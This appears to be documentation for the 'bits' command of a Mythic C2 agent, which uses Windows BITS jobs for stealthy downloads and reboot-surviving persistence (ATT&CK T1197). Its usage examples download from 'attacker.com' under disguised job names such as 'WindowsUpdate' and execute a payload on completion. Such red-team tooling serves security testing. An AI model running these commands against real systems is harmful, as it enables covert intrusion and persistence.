+++
title = "bits"
chapter = false
weight = 160
hidden = false
+++

## Summary

Manage BITS (Background Intelligent Transfer Service) transfer jobs for persistence and stealthy file download. BITS jobs survive reboots, transfer files using Windows' native BITS infrastructure, and can execute a command upon completion — making them useful for persistence.

{{% notice info %}}Windows Only{{% /notice %}}

## Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| action | No | list | `list` — enumerate all BITS jobs. `create` — create a download job. `persist` — create a download job with notification command. `cancel` — remove a job by name |
| name | Varies | | Display name for the BITS job (required for create/persist/cancel) |
| url | Varies | | Remote URL to download from (required for create/persist) |
| path | Varies | | Local file path to save the download (required for create/persist). Must use backslashes |
| command | Varies | | Program to execute when download completes (required for persist). Full path to executable |
| cmd_args | No | | Arguments for the notification command (persist action) |

## Usage

**List all BITS jobs:**
```
bits
bits -action list
```

**Create a download job:**
```
bits -action create -name "WindowsUpdate" -url "http://attacker.com/payload.exe" -path "C:\Users\Public\update.exe"
```

**Create a persistent job (executes command on download completion):**
```
bits -action persist -name "UpdateCheck" -url "http://attacker.com/data.dat" -path "C:\Users\Public\data.dat" -command "C:\Users\Public\payload.exe"
```

**Cancel a job by name:**
```
bits -action cancel -name "WindowsUpdate"
```

## Output Format

**List** returns a JSON array of BITS jobs (rendered as a sortable table in the Mythic UI with color-coded states):

```json
[
  {"job_id": "{6EC08B7E-...}", "name": "WindowsUpdate", "state": "Transferring", "bytes_transferred": 2411724, "bytes_total": 5242880, "files_transferred": 0, "files_total": 1},
  {"job_id": "{0C43F924-...}", "name": "UpdateCheck", "state": "Suspended", "bytes_transferred": 0, "bytes_total": 0, "files_transferred": 0, "files_total": 1}
]
```

**Create**, **persist**, and **cancel** actions return plain text status messages.

## Operational Notes

- Uses raw COM vtable calls to IBackgroundCopyManager/Job/Job2 (no IDispatch)
- BITS jobs survive reboots and resume automatically
- Persistence via `SetNotifyCmdLine` (IBackgroundCopyJob2) executes a command when transfer completes or errors
- Local paths must use backslashes (`C:\Users\...`), forward slashes are rejected by the BITS API
- Jobs run under the security context of the creating user
- `list` first tries current-user jobs, falls back to all-users enumeration
- Job states: Queued, Connecting, Transferring, Suspended, Error, TransientError, Transferred, Acknowledged, Cancelled

## MITRE ATT&CK Mapping

- **T1197** — BITS Jobs
